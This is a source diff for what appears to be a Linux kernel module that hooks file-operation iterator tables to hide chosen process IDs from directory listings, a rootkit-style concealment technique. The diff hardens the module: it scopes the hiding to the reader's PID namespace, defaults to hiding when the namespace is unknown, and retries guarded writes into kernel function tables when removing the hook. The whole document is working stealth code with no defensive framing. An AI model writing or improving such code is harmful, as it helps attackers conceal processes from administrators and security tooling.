@@ -25,6 +25,9 @@ typedef int hide_filldir_ret_t;
 #include <linux/uidgid.h>
 #include <linux/atomic.h>
 #include <linux/rculist.h>
+#include <linux/pid_namespace.h>
+#include <linux/sched.h>
+#include <linux/sched/task.h>
 
 /* filp_open/filp_close resolved at runtime via kallsyms (memd_utils.c).
  * No VFS namespace import needed — avoids loader rejection on some kernels. */
@@ -105,12 +108,18 @@ static iterate_shared_fn memd_orig_for_ops(const struct file_operations *ops)
 
 static bool should_hide_pid(pid_t pid, struct pid_namespace *ns)
  {
+    /* NULL reader ns is unresolvable: fail closed (hide) rather
+     * than leak a possibly-hidden entry. */
+    if (!ns)
+        return true;
     return memd_hide_contains_ns(pid, ns);
 }
 
 static bool name_is_hidden_pid(const char *name, int namlen)
  {
     unsigned long v = 0;
+    struct pid_namespace *ns;
+    bool hidden;
     int i;
 
     if (namlen <= 0 || namlen > 7)
@@ -120,7 +129,18 @@ static bool name_is_hidden_pid(const char *name, int namlen)
             return false;
         v = v * 10 + (unsigned int)(name[i] - '0');
     }
-    return should_hide_pid((pid_t)v, &init_pid_ns);
+    /* Reader-scoped: the dirname number is in the reader's numbering
+     * and entries are keyed (pid, active-ns) at add/del, so match
+     * against the READER's active ns. Borrowed under RCU (no ref,
+     * no sleep); the pointer comparison inside contains_ns stays
+     * valid across its spinlock because this RCU section is still
+     * held and current pins its own ns. Init-ns readers yield
+     * &init_pid_ns here, identical to the old hardcoded behavior. */
+    rcu_read_lock();
+    ns = task_active_pid_ns(current);
+    hidden = should_hide_pid((pid_t)v, ns);
+    rcu_read_unlock();
+    return hidden;
 }
 
 static hide_filldir_ret_t hide_filldir(struct dir_context *ctx,
@@ -257,45 +277,82 @@ static int install_hooks_on_fops(const struct file_operations *ops, iterate_shar
      return 0;
  }
 
+/* Uninstall retry budget: each attempt is one guarded write plus a
+ * readback (the write path already retries its entry store internally).
+ * Three back-to-back attempts ride out a transient extable fault or
+ * stale-TLB hiccup with no sleeps and no unbounded loop, so rmmod can
+ * never hang here. A persistently failing write (hypervisor trapping
+ * the stores, tables remapped under us) is NOT fixed by retrying;
+ * see the header for why that case has no in-kernel remedy. */
+#define MEMD_UNINSTALL_RETRIES 3
+
 static int uninstall_hooks_from_fops(const struct file_operations *ops, iterate_shared_fn orig_iter)
   {
+     int attempt;
      int wr;
      iterate_shared_fn back;
      iterate_shared_fn live;
 
-     live = (iterate_shared_fn)memd_iter_get(ops);
+     for (attempt = 0; attempt < MEMD_UNINSTALL_RETRIES; attempt++) {
+         live = (iterate_shared_fn)memd_iter_get(ops);
 
-     /* Already showing our saved pointer (owner put it back, or a
-      * retried uninstall): nothing to do. */
+         /* Already showing our saved pointer (owner put it back, or a
+          * retried uninstall): nothing to do. */
+         if (live == orig_iter && live)
+             return 0;
+
+         /* Slot no longer points at us: the owner (or a stacked third-party
+          * hook) repointed it after install. Restoring the stale saved orig
+          * would clobber their live entry — possibly a pointer into a module
+          * that chains back into us — so refuse (-EBUSY) and keep the
+          * bookkeeping; a later uninstall retries once the slot is ours
+          * again. Restoring the MODIFIED value is never right here: only the
+          * slot owner may publish it, and we did not author it. */
+         if (!live || live != memd_iterate_shared) {
+             memd_err("hide uninstall: table owned by someone else; refusing\n");
+             return -EBUSY;
+         }
+
+         wr = memd_table_write64((unsigned long)ops + (unsigned long)memd_iter_off(),
+                                 (unsigned long)orig_iter);
+         if (wr) {
+             memd_err("hide uninstall: table write failed (try %d)\n", attempt);
+             continue;
+         }
+
+         back = (iterate_shared_fn)memd_iter_get(ops);
+         if (back && back == orig_iter)
+             return 0;
+
+         /* Readback mismatch: re-check who owns the slot before deciding.
+          * An owner racing our restore may have repointed the slot between
+          * our store and this read. If the slot no longer points at us,
+          * nothing dangles and the honest code is -EBUSY (safe to unload),
+          * not -EIO. Only a slot STILL pointing at our code after our own
+          * write is the dangerous case (store swallowed: hypervisor trap
+          * or emulation), worth another attempt. */
+         live = (iterate_shared_fn)memd_iter_get(ops);
+         if (live == orig_iter && live)
+             return 0;
+         if (!live || live != memd_iterate_shared) {
+             memd_err("hide uninstall: owner raced restore; refusing\n");
+             return -EBUSY;
+         }
+         memd_err("hide uninstall: readback mismatch (try %d)\n", attempt);
+     }
+
+     /* Attempts exhausted: classify once more so the caller (and __exit)
+      * can tell "safe to unload, owner took the slot" (-EBUSY) from
+      * "slot still points at code about to be freed" (-EIO). */
+     live = (iterate_shared_fn)memd_iter_get(ops);
      if (live == orig_iter && live)
          return 0;
-
-     /* Slot no longer points at us: the owner (or a stacked third-party
-      * hook) repointed it after install. Restoring the stale saved orig
-      * would clobber their live entry — possibly a pointer into a module
-      * that chains back into us — so refuse (-EBUSY) and keep the
-      * bookkeeping; a later uninstall retries once the slot is ours
-      * again. Restoring the MODIFIED value is never right here: only the
-      * slot owner may publish it, and we did not author it. */
      if (!live || live != memd_iterate_shared) {
          memd_err("hide uninstall: table owned by someone else; refusing\n");
          return -EBUSY;
      }
-
-     wr = memd_table_write64((unsigned long)ops + (unsigned long)memd_iter_off(),
-                             (unsigned long)orig_iter);
-     if (wr) {
-         memd_err("hide uninstall: table write failed\n");
-         return -EIO;
-     }
-
-     back = (iterate_shared_fn)memd_iter_get(ops);
-     if (!back || back != orig_iter) {
-        memd_err("hide uninstall: readback mismatch\n");
-        return -EIO;
-    }
-
-    return 0;
+     memd_err("hide uninstall: table write failed; hook still live\n");
+     return -EIO;
 }
 
 int memd_hide_install(void)
